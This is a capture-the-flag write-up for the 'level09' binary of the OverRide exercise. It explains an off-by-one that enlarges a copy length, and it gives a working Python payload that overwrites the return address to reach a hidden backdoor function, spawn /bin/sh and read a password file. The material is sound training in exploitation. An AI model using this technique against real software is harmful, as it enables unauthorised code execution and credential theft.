# level09

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```console
level09@OverRide:~$ checksec --file ./level09
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./level09
```

From our analysis of the program, here are the different steps performed:

- The `main` function calls `handle_msg` which declares a structure containing a 40 bytes buffer we will call
  `username`, another one of 140 bytes, `msg`, and an integer, `msglen`, set to 140.
- The structure address is sent to `set_username` which fills an intermediate buffer of 128 bytes thanks to a `fgets`
  call on the standard input, then uses a `for` loop that copies 41 characters from the intermediate buffer to
  `username`. A programming error is present here and opens a vulnerability. Indeed, the `username` variable is an array
  of 40 characters but the `for` loop goes through 41 characters, allowing us to overwrite one byte of the next
  structure's variable `msglen`.
- The next function called `set_msg` is similar to `set_username`: a buffer of 1024 bytes is filled with `fgets`, then
  copied to `msg` via `strncpy` with the `msglen` variable as its size parameter. Since we know we can overwrite one
  byte of `msglen` value, we will try to reach the return address pointer of `handle_msg` by copying enough bytes.

According to `checksec` output, we can't execute code from the stack, hopefully a hidden function `secret_backdoor` has
been declared.

```gdb
gdb-peda$ pd secret_backdoor
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:     push   rbp
   0x000055555555488d <+1>:     mov    rbp,rsp
   0x0000555555554890 <+4>:     add    rsp,0xffffffffffffff80
   0x0000555555554894 <+8>:     mov    rax,QWORD PTR [rip+0x20171d]
   0x000055555555489b <+15>:    mov    rax,QWORD PTR [rax]
   0x000055555555489e <+18>:    mov    rdx,rax
   0x00005555555548a1 <+21>:    lea    rax,[rbp-0x80]
   0x00005555555548a5 <+25>:    mov    esi,0x80
   0x00005555555548aa <+30>:    mov    rdi,rax
   0x00005555555548ad <+33>:    call   0x555555554770 <fgets@plt>
   0x00005555555548b2 <+38>:    lea    rax,[rbp-0x80]
   0x00005555555548b6 <+42>:    mov    rdi,rax
   0x00005555555548b9 <+45>:    call   0x555555554740 <system@plt>
   0x00005555555548be <+50>:    leave
   0x00005555555548bf <+51>:    ret
End of assembler dump.
```

This function calls `fgets` to fill a buffer of 128 characters from the standard input, then uses it as a command sent
to `system`.

## Exploit

Since the binary has been compiled in 64-bit, we need to find the right offset to overwrite the content of the stack
pointer RSP (not the EIP/RIP) in order to make `handle_msg` jump to `secret_backdoor` instead of returning to `main`.

To do so, We prepare the following string : 40 characters + the bigger one-byte value (0xff or 255) to overwrite
`msglen` value and make `strncpy` go as far as we can + a newline character to end the first `fgets` + a string of 256
characters generated via this [buffer overflow string
generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) that supports 64-bit registers.

```console
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"' > /tmp/level09
```

```gdb
gdb-peda$ r < /tmp/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xd ('\r')
RBX: 0x0
RCX: 0x7ffff7b01f90 (<write+16>:	cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd5a90 --> 0x0
RSI: 0x7ffff7ff7000 (">>: >: Msg sent!\n", 'A' <repeats 39 times>"\377, >: Msg @Unix-Dude\n")
RDI: 0xffffffff
RBP: 0x6741356741346741 ('Ag4Ag5Ag')
RSP: 0x7fffffffe5c8 ("6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
RIP: 0x555555554931 (<handle_msg+113>:	ret)
R8 : 0x7ffff7ff7004 (">: Msg sent!\n", 'A' <repeats 39 times>"\377, >: Msg @Unix-Dude\n")
R9 : 0xc ('\x0c')
R10: 0x21 ('!')
R11: 0x246
R12: 0x555555554790 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe6b0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554924 <handle_msg+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
   0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
   0x555555554930 <handle_msg+112>:	leave
=> 0x555555554931 <handle_msg+113>:	ret
   0x555555554932 <set_msg>:	push   rbp
   0x555555554933 <set_msg+1>:	mov    rbp,rsp
   0x555555554936 <set_msg+4>:	sub    rsp,0x410
   0x55555555493d <set_msg+11>:	mov    QWORD PTR [rbp-0x408],rdi
```

We provide the RBP address `0x6741356741346741` to our tool, then add 8 to the result to reach the RSP content offset,
200.

Now, we get the `secret_backdoor` address with gdb. Note that the program must have been started to get the right
address after the dynamic relocation.

```gdb
gdb-peda$ info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

From here we have everything we need to perform the exploit. Let's generate our final string, composed of three parts :

- In first, we copy the same string as the previous one we have used to fill the first `fgets` call and overwrite
  `msglen` value, but we may change this value to match exactly the needed size, 200 + 8 bytes (for the address itself),
  so 0xd0 in hexadecimal.
- Then, 200 characters to reach the offset, the `secret_backdoor` address which will overwrite the content of RSP, and a
  newline character to stop the second `fgets` reading.
- Finally, if everything works as expected, we will jump to `secret_backdoor` which uses a third `fgets` to get the
  command to send to `system`, so we just add `"/bin/sh"`. Here we go!

```console
python -c 'print "A" * 40 + "\xd0" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/level09
level09@OverRide:~$ cat /tmp/level09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
